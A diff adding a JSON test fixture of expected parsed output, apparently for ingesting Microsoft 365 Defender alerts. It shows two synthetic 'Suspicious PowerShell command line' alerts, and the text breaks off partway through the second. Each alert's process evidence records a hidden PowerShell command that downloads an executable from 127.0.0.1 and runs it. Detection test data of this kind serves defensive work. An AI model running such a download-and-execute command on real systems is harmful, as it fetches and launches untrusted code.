@@ -1,0 +1,1272 @@
+{
+  "expected": [
+    {
+      "@timestamp": "2051-10-20T09:54:07.503Z",
+      "cloud": {
+        "account": {
+          "id": "2bde388d-8a81-40d3-a25e-0dbc2cacdc64"
+        }
+      },
+      "device": {
+        "id": [
+          "b51cc058-a3f4-47f8-8fcd-7c86b56e3c97"
+        ]
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "action": [
+          "detected"
+        ],
+        "category": [
+          "host",
+          "iam",
+          "network",
+          "process"
+        ],
+        "created": "2051-10-20T09:53:09.883Z",
+        "duration": 2478000000,
+        "end": "2051-10-20T09:51:41.993Z",
+        "id": "daefa1828b-dd4e-405c-8a3b-aa28596830dd_1",
+        "kind": "alert",
+        "original": "{\"id\":\"daefa1828b-dd4e-405c-8a3b-aa28596830dd_1\",\"providerAlertId\":\"feb6871d-ca7f-447f-8c7e-da40121645da_1\",\"incidentId\":\"23\",\"status\":\"new\",\"severity\":\"medium\",\"classification\":null,\"determination\":null,\"serviceSource\":\"microsoftDefenderForEndpoint\",\"detectionSource\":\"microsoftDefenderForEndpoint\",\"productName\":\"Microsoft Defender for Endpoint\",\"detectorId\":\"0a5a7718-b7ae-46c4-911f-b23302242c62\",\"tenantId\":\"2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"title\":\"Suspicious PowerShell command line\",\"description\":\"A suspicious PowerShell activity was observed on the machine. \\nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.\",\"recommendedActions\":\"1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\\n2. Search the script for more indicators to investigate - for example IP addresses (potential C&C servers), target computers etc.\\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.\",\"category\":\"Execution\",\"assignedTo\":null,\"alertWebUrl\":\"https:\\/\\/security.microsoft.com\\/alerts\\/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"incidentWebUrl\":\"https:\\/\\/security.microsoft.com\\/incidents\\/23?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"actorDisplayName\":null,\"threatDisplayName\":null,\"threatFamilyName\":null,\"mitreTechniques\":[\"T1059.001\"],\"createdDateTime\":\"2051-10-20T09:53:09.8839373Z\",\"lastUpdateDateTime\":\"2051-10-20T09:54:07.5033333Z\",\"resolvedDateTime\":null,\"firstActivityDateTime\":\"2051-10-20T09:51:39.5154802Z\",\"lastActivityDateTime\":\"2051-10-20T09:51:41.9939003Z\",\"alertPolicyId\":null,\"additionalData\":null,\"comments\":[],\"evidence\":[{\"@odata.type\":\"#microsoft.graph.security.deviceEvidence\",\"createdDateTime\":\"2051-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[\"PrimaryDevice\"],\"tags\":[],\"firstSeenDateTime\":\"2051-10-20T09:50:17.7383987Z\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"azureAdDeviceId\":\"b51cc058-a3f4-47f8-8fcd-7c86b56e3c97\",\"deviceDnsName\":\"clw555test\",\"osPlatform\":\"Windows11\",\"osBuild\":22621,\"version\":\"22H2\",\"healthStatus\":\"inactive\",\"riskScore\":\"high\",\"rbacGroupId\":0,\"rbacGroupName\":null,\"onboardingStatus\":\"onboarded\",\"defenderAvStatus\":\"notSupported\",\"ipInterfaces\":[\"192.168.72.3\",\"fe80::cfe4:80b:615c:38fb\",\"127.0.0.1\",\"::1\"],\"vmMetadata\":null,\"loggedOnUsers\":[{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\"}]},{\"@odata.type\":\"#microsoft.graph.security.userEvidence\",\"createdDateTime\":\"2051-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}},{\"@odata.type\":\"#microsoft.graph.security.urlEvidence\",\"createdDateTime\":\"2051-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"url\":\"http:\\/\\/127.0.0.1\\/1.exe\"},{\"@odata.type\":\"#microsoft.graph.security.ipEvidence\",\"createdDateTime\":\"2051-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"ipAddress\":\"127.0.0.1\",\"countryLetterCode\":null},{\"@odata.type\":\"#microsoft.graph.security.processEvidence\",\"createdDateTime\":\"2051-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"processId\":8224,\"parentProcessId\":5772,\"processCommandLine\":\"powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http:\\/\\/127.0.0.1\\/1.exe', 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe');Start-Process 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe'\",\"processCreationDateTime\":\"2051-10-20T09:51:39.4997961Z\",\"parentProcessCreationDateTime\":\"2051-10-20T09:51:19.5064237Z\",\"detectionStatus\":\"detected\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"imageFile\":{\"sha1\":\"f64f11028554687a33ba8252c6cdb0e43c31c686\",\"sha256\":\"f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17\",\"fileName\":\"powershell.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\",\"fileSize\":491520,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"parentProcessImageFile\":{\"sha1\":null,\"sha256\":null,\"fileName\":\"cmd.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\",\"fileSize\":323584,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}}]}",
+        "provider": "microsoftDefenderForEndpoint",
+        "severity": 47,
+        "start": "2051-10-20T09:51:39.515Z",
+        "type": [
+          "info"
+        ],
+        "url": "https://security.microsoft.com/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64"
+      },
+      "host": {
+        "hostname": [
+          "clw555test"
+        ],
+        "id": [
+          "735f41e26eba5899c9cbe8b0bb8e74e32de2a509"
+        ],
+        "ip": [
+          "192.168.72.3",
+          "fe80::cfe4:80b:615c:38fb",
+          "127.0.0.1",
+          "::1"
+        ],
+        "os": {
+          "name": [
+            "Windows11"
+          ],
+          "version": [
+            "22H2"
+          ]
+        }
+      },
+      "m365_defender": {
+        "alert": {
+          "category": "Execution",
+          "created_datetime": "2051-10-20T09:53:09.883Z",
+          "description": "A suspicious PowerShell activity was observed on the machine. \nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.",
+          "detection_source": "microsoftDefenderForEndpoint",
+          "detector_id": "0a5a7718-b7ae-46c4-911f-b23302242c62",
+          "evidence": [
+            {
+              "azure_ad_device_id": "b51cc058-a3f4-47f8-8fcd-7c86b56e3c97",
+              "created_datetime": "2051-10-20T09:53:10.193Z",
+              "defender_av_status": "notSupported",
+              "detailed_roles": [
+                "PrimaryDevice"
+              ],
+              "device_dns_name": "clw555test",
+              "first_seen_datetime": "2051-10-20T09:50:17.738Z",
+              "health_status": "inactive",
+              "ip_interfaces": [
+                "192.168.72.3",
+                "fe80::cfe4:80b:615c:38fb",
+                "127.0.0.1",
+                "::1"
+              ],
+              "logged_on_users": [
+                {
+                  "account_name": "ACVSqdkLV-14709",
+                  "domain_name": "AzureAD"
+                }
+              ],
+              "mde_device_id": "735f41e26eba5899c9cbe8b0bb8e74e32de2a509",
+              "odata_type": "#microsoft.graph.security.deviceEvidence",
+              "onboarding_status": "onboarded",
+              "os_build": "22621",
+              "os_platform": "Windows11",
+              "rbac_group": {
+                "id": "0"
+              },
+              "remediation_status": "none",
+              "risk_score": "high",
+              "verdict": "unknown",
+              "version": "22H2"
+            },
+            {
+              "created_datetime": "2051-10-20T09:53:10.193Z",
+              "odata_type": "#microsoft.graph.security.userEvidence",
+              "remediation_status": "none",
+              "user_account": {
+                "account_name": "ACVSqdkLV-14709",
+                "domain_name": "AzureAD",
+                "user_sid": "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
+              },
+              "verdict": "unknown"
+            },
+            {
+              "created_datetime": "2051-10-20T09:53:10.193Z",
+              "odata_type": "#microsoft.graph.security.urlEvidence",
+              "remediation_status": "none",
+              "url": "http://127.0.0.1/1.exe",
+              "verdict": "suspicious"
+            },
+            {
+              "created_datetime": "2051-10-20T09:53:10.193Z",
+              "ip_address": "127.0.0.1",
+              "odata_type": "#microsoft.graph.security.ipEvidence",
+              "remediation_status": "none",
+              "verdict": "suspicious"
+            },
+            {
+              "created_datetime": "2051-10-20T09:53:10.193Z",
+              "detection_status": "detected",
+              "image_file": {
+                "name": "powershell.exe",
+                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+                "publisher": "Microsoft Corporation",
+                "sha1": "f64f11028554687a33ba8252c6cdb0e43c31c686",
+                "sha256": "f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17",
+                "size": 491520
+              },
+              "mde_device_id": "735f41e26eba5899c9cbe8b0bb8e74e32de2a509",
+              "odata_type": "#microsoft.graph.security.processEvidence",
+              "parent_process": {
+                "creation_datetime": "2051-10-20T09:51:19.506Z",
+                "id": 5772,
+                "image_file": {
+                  "name": "cmd.exe",
+                  "path": "C:\\Windows\\System32",
+                  "publisher": "Microsoft Corporation",
+                  "size": 323584
+                }
+              },
+              "process": {
+                "command_line": "powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\\\test-WDATP-test\\\\invoice.exe');Start-Process 'C:\\\\test-WDATP-test\\\\invoice.exe'",
+                "creation_datetime": "2051-10-20T09:51:39.499Z",
+                "id": 8224
+              },
+              "remediation_status": "none",
+              "user_account": {
+                "account_name": "ACVSqdkLV-14709",
+                "domain_name": "AzureAD",
+                "user_sid": "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
+              },
+              "verdict": "unknown"
+            }
+          ],
+          "first_activity_datetime": "2051-10-20T09:51:39.515Z",
+          "id": "daefa1828b-dd4e-405c-8a3b-aa28596830dd_1",
+          "incident_id": "23",
+          "incident_web_url": {
+            "domain": "security.microsoft.com",
+            "original": "https://security.microsoft.com/incidents/23?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+            "path": "/incidents/23",
+            "query": "tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+            "scheme": "https"
+          },
+          "last_activity_datetime": "2051-10-20T09:51:41.993Z",
+          "last_update_datetime": "2051-10-20T09:54:07.503Z",
+          "mitre_techniques": [
+            "T1059.001"
+          ],
+          "provider_alert_id": "feb6871d-ca7f-447f-8c7e-da40121645da_1",
+          "recommended_actions": "1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\n2. Search the script for more indicators to investigate - for example IP addresses (potential C&C servers), target computers etc.\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.",
+          "service_source": "microsoftDefenderForEndpoint",
+          "severity": "medium",
+          "status": "new",
+          "tenant_id": "2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+          "title": "Suspicious PowerShell command line",
+          "web_url": {
+            "domain": "security.microsoft.com",
+            "original": "https://security.microsoft.com/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+            "path": "/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1",
+            "query": "tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+            "scheme": "https"
+          }
+        }
+      },
+      "message": "A suspicious PowerShell activity was observed on the machine. \nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.",
+      "process": {
+        "command_line": [
+          "powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\\\test-WDATP-test\\\\invoice.exe');Start-Process 'C:\\\\test-WDATP-test\\\\invoice.exe'"
+        ],
+        "entity_id": [
+          "p5sq8fseyY2I8WhxMNDaHNcR/A4="
+        ],
+        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "hash": {
+          "sha1": [
+            "f64f11028554687a33ba8252c6cdb0e43c31c686"
+          ],
+          "sha256": [
+            "f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17"
+          ]
+        },
+        "name": [
+          "powershell.exe"
+        ],
+        "parent": {
+          "entity_id": [
+            "cUHUHJV7xyREXU6Yz49/Wpm7h/8="
+          ],
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "pid": [
+            5772
+          ],
+          "start": [
+            "2051-10-20T09:51:19.506Z"
+          ]
+        },
+        "pid": [
+          8224
+        ],
+        "start": [
+          "2051-10-20T09:51:39.499Z"
+        ],
+        "user": {
+          "name": [
+            "ACVSqdkLV-14709"
+          ]
+        }
+      },
+      "related": {
+        "hash": [
+          "f64f11028554687a33ba8252c6cdb0e43c31c686",
+          "f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17"
+        ],
+        "hosts": [
+          "735f41e26eba5899c9cbe8b0bb8e74e32de2a509",
+          "Windows11",
+          "22H2",
+          "clw555test",
+          "AzureAD"
+        ],
+        "ip": [
+          "192.168.72.3",
+          "fe80::cfe4:80b:615c:38fb",
+          "127.0.0.1",
+          "::1"
+        ],
+        "user": [
+          "ACVSqdkLV-14709",
+          "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
+        ]
+      },
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ],
+      "threat": {
+        "tactic": {
+          "name": [
+            "Execution"
+          ]
+        },
+        "technique": {
+          "subtechnique": {
+            "id": [
+              "T1059.001"
+            ]
+          }
+        }
+      },
+      "url": {
+        "original": [
+          "http://127.0.0.1/1.exe"
+        ]
+      },
+      "user": {
+        "domain": [
+          "AzureAD"
+        ],
+        "name": [
+          "ACVSqdkLV-14709"
+        ]
+      }
+    },
+    {
+      "@timestamp": "2052-10-20T09:54:07.503Z",
+      "cloud": {
+        "account": {
+          "id": "2bde388d-8a81-40d3-a25e-0dbc2cacdc64"
+        }
+      },
+      "device": {
+        "id": [
+          "b51cc058-a3f4-47f8-8fcd-7c86b56e3c97"
+        ]
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "email": {
+        "local_id": [
+          "b19dfef8-95a1-427a-b42d-6f3a257884ef"
+        ],
+        "message_id": [
+          "81ce15$1h8z87@mail01.example.com"
+        ]
+      },
+      "event": {
+        "action": [
+          "detected"
+        ],
+        "category": [
+          "host",
+          "iam",
+          "network",
+          "process"
+        ],
+        "created": "2052-10-20T09:53:09.883Z",
+        "duration": 2478000000,
+        "end": "2052-10-20T09:51:41.993Z",
+        "id": "daefa1828b-dd4e-405c-8a3b-aa28596830dd_2",
+        "kind": "alert",
+        "original": "{\"id\":\"daefa1828b-dd4e-405c-8a3b-aa28596830dd_2\",\"providerAlertId\":\"feb6871d-ca7f-447f-8c7e-da40121645da_2\",\"incidentId\":\"33\",\"status\":\"new\",\"severity\":\"medium\",\"classification\":null,\"determination\":null,\"serviceSource\":\"microsoftDefenderForEndpoint\",\"detectionSource\":\"microsoftDefenderForEndpoint\",\"productName\":\"Microsoft Defender for Endpoint\",\"detectorId\":\"0a5a7718-b7ae-46c4-911f-b23302242c62\",\"tenantId\":\"2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"title\":\"Suspicious PowerShell command line\",\"description\":\"A suspicious PowerShell activity was observed on the machine. \\nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.\",\"recommendedActions\":\"1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\\n2. Search the script for more indicators to investigate - for example IP addresses (potential C&C servers), target computers etc.\\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.\",\"category\":\"Execution\",\"assignedTo\":null,\"alertWebUrl\":\"https:\\/\\/security.microsoft.com\\/alerts\\/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"incidentWebUrl\":\"https:\\/\\/security.microsoft.com\\/incidents\\/23?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"actorDisplayName\":null,\"threatDisplayName\":null,\"threatFamilyName\":null,\"mitreTechniques\":[\"T1059.001\"],\"createdDateTime\":\"2052-10-20T09:53:09.8839373Z\",\"lastUpdateDateTime\":\"2052-10-20T09:54:07.5033333Z\",\"resolvedDateTime\":null,\"firstActivityDateTime\":\"2052-10-20T09:51:39.5154802Z\",\"lastActivityDateTime\":\"2052-10-20T09:51:41.9939003Z\",\"alertPolicyId\":null,\"additionalData\":null,\"comments\":[],\"evidence\":[{\"internetMessageId\":\"81ce15$1h8z87@mail01.example.com\",\"networkMessageId\":\"b19dfef8-95a1-427a-b42d-6f3a257884ef\",\"senderIp\": \"203.0.113.138\",\"@odata.type\":\"#microsoft.graph.security.deviceEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[\"PrimaryDevice\"],\"tags\":[],\"firstSeenDateTime\":\"2052-10-20T09:50:17.7383987Z\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"azureAdDeviceId\":\"b51cc058-a3f4-47f8-8fcd-7c86b56e3c97\",\"deviceDnsName\":\"clw555test\",\"osPlatform\":\"Windows11\",\"osBuild\":22621,\"version\":\"22H2\",\"healthStatus\":\"inactive\",\"riskScore\":\"high\",\"rbacGroupId\":0,\"rbacGroupName\":null,\"onboardingStatus\":\"onboarded\",\"defenderAvStatus\":\"notSupported\",\"ipInterfaces\":[\"192.168.72.3\",\"fe80::cfe4:80b:615c:38fb\",\"127.0.0.1\",\"::1\"],\"vmMetadata\":null,\"loggedOnUsers\":[{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\"}]},{\"@odata.type\":\"#microsoft.graph.security.userEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}},{\"@odata.type\":\"#microsoft.graph.security.urlEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"url\":\"http:\\/\\/127.0.0.1\\/1.exe\"},{\"@odata.type\":\"#microsoft.graph.security.ipEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"ipAddress\":\"127.0.0.1\",\"countryLetterCode\":null},{\"@odata.type\":\"#microsoft.graph.security.processEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"processId\":8224,\"parentProcessId\":5772,\"processCommandLine\":\"powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http:\\/\\/127.0.0.1\\/1.exe', 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe');Start-Process 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe'\",\"processCreationDateTime\":\"2052-10-20T09:51:39.4997961Z\",\"parentProcessCreationDateTime\":\"2052-10-20T09:51:19.5064237Z\",\"detectionStatus\":\"detected\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"imageFile\":{\"sha1\":\"f64f11028554687a33ba8252c6cdb0e43c31c686\",\"sha256\":\"f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17\",\"fileName\":\"powershell.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\",\"fileSize\":491520,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"parentProcessImageFile\":{\"sha1\":null,\"sha256\":null,\"fileName\":\"cmd.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\",\"fileSize\":323584,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}}]}",
+        "provider": "microsoftDefenderForEndpoint",
+        "severity": 47,
+        "start": "2052-10-20T09:51:39.515Z",
+        "type": [
+          "info"
+        ],
+        "url": "https://security.microsoft.com/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64"
+      },
+      "host": {
+        "hostname": [
+          "clw555test"
+        ],
+        "id": [
+          "735f41e26eba5899c9cbe8b0bb8e74e32de2a509"
+        ],
+        "ip": [
+          "192.168.72.3",
+          "fe80::cfe4:80b:615c:38fb",
+          "127.0.0.1",
+          "::1"
+        ],
+        "os": {
+          "name": [
+            "Windows11"
+          ],
+          "version": [
+            "22H2"
+          ]
+        }
+      },
+      "m365_defender": {
+        "alert": {
+          "category": "Execution",
+          "created_datetime": "2052-10-20T09:53:09.883Z",
+          "description": "A suspicious PowerShell activity was observed on the machine. \nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.",
+          "detection_source": "microsoftDefenderForEndpoint",
+          "detector_id": "0a5a7718-b7ae-46c4-911f-b23302242c62",
+          "evidence": [
+            {
+              "azure_ad_device_id": "b51cc058-a3f4-47f8-8fcd-7c86b56e3c97",
+              "created_datetime": "2052-10-20T09:53:10.193Z",
+              "defender_av_status": "notSupported",
+              "detailed_roles": [
+                "PrimaryDevice"
+              ],
+              "device_dns_name": "clw555test",
+              "first_seen_datetime": "2052-10-20T09:50:17.738Z",
+              "health_status": "inactive",
+              "ip_interfaces": [
+                "192.168.72.3",
+                "fe80::cfe4:80b:615c:38fb",
+                "127.0.0.1",
+                "::1"
+              ],
+              "logged_on_users": [
+                {
+                  "account_name": "ACVSqdkLV-14709",
+                  "domain_name": "AzureAD"
+                }
+              ],
+              "mde_device_id": "735f41e26eba5899c9cbe8b0bb8e74e32de2a509",
+              "odata_type": "#microsoft.graph.security.deviceEvidence",
+              "onboarding_status": "onboarded",
+              "os_build": "22621",
+              "os_platform": "Windows11",
+              "rbac_group": {
+                "id": "0"
+              },
+              "remediation_status": "none",
+              "risk_score": "high",
+              "sender_ip": "203.0.113.138",
+              "verdict": "unknown",
+              "version": "22H2"
+            },
+            {
+              "created_datetime": "2052-10-20T09:53:10.193Z",
+              "odata_type": "#microsoft.graph.security.userEvidence",
+              "remediation_status": "none",
+              "user_account": {
+                "account_name": "ACVSqdkLV-14709",
+                "domain_name": "AzureAD",
+                "user_sid": "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
+              },
+              "verdict": "unknown"
+            },
+            {
+              "created_datetime": "2052-10-20T09:53:10.193Z",
+              "odata_type": "#microsoft.graph.security.urlEvidence",
+              "remediation_status": "none",
+              "url": "http://127.0.0.1/1.exe",
+              "verdict": "suspicious"
+            },
+            {
+              "created_datetime": "2052-10-20T09:53:10.193Z",
+              "ip_address": "127.0.0.1",
+              "odata_type": "#microsoft.graph.security.ipEvidence",
+              "remediation_status": "none",
+              "verdict": "suspicious"
+            },
+            {
+              "created_datetime": "2052-10-20T09:53:10.193Z",
+              "detection_status": "detected",
+              "image_file": {
+                "name": "powershell.exe",
+                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+                "publisher": "Microsoft Corporation",
+                "sha1": "f64f11028554687a33ba8252c6cdb0e43c31c686",
+                "sha256": "f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17",
+                "size": 491520
+              },
+              "mde_device_id": "735f41e26eba5899c9cbe8b0bb8e74e32de2a509",
+              "odata_type": "#microsoft.graph.security.processEvidence",
+              "parent_process": {
+                "creation_datetime": "2052-10-20T09:51:19.506Z",
+                "id": 5772,
+                "image_file": {
+                  "name": "cmd.exe",
+                  "path": "C:\\Windows\\System32",
+                  "publisher": "Microsoft Corporation",
+                  "size": 323584
+                }
+              },
+              "process": {
+                "command_line": "powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\\\test-WDATP-test\\\\invoice.exe');Start-Process 'C:\\\\test-WDATP-test\\\\invoice.exe'",
+                "creation_datetime": "2052-10-20T09:51:39.499Z",
+                "id": 8224
+              },
+              "remediation_status": "none",
+              "user_account": {
+                "account_name": "ACVSqdkLV-14709",
+                "domain_name": "AzureAD",
+                "user_sid": "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
+              },
+              "verdict": "unknown"
+            }
+          ],
+          "first_activity_datetime": "2052-10-20T09:51:39.515Z",
+          "id": "daefa1828b-dd4e-405c-8a3b-aa28596830dd_2",
+          "incident_id": "33",
+          "incident_web_url": {
+            "domain": "security.microsoft.com",
+            "original": "https://security.microsoft.com/incidents/23?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+            "path": "/incidents/23",
+            "query": "tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+            "scheme": "https"
+          },
+          "last_activity_datetime": "2052-10-20T09:51:41.993Z",
+          "last_update_datetime": "2052-10-20T09:54:07.503Z",
+          "mitre_techniques": [
+            "T1059.001"
+          ],
+          "provider_alert_id": "feb6871d-ca7f-447f-8c7e-da40121645da_2",
+          "recommended_actions": "1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\n2. Search the script for more indicators to investigate - for example IP addresses (potential C&C servers), target computers etc.\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.",
+          "service_source": "microsoftDefenderForEndpoint",
+          "severity": "medium",
+          "status": "new",
+          "tenant_id": "2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+          "title": "Suspicious PowerShell command line",
+          "web_url": {
+            "domain": "security.microsoft.com",
+            "original": "https://security.microsoft.com/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+            "path": "/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1",
+            "query": "tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
